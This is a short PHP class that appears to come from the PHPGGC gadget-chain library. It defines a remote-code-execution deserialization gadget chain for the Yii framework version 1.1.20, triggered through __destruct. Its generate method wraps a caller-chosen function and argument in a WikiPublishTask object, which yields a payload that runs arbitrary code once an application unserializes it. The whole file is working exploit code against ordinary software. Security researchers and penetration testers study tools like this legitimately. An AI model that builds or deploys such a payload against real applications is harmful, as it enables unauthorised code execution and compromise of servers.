<?php

namespace GadgetChain\Yii;

class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.1.20';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        $a = new \WikiPublishTask($function, $parameter);

        return $a;
    }
}
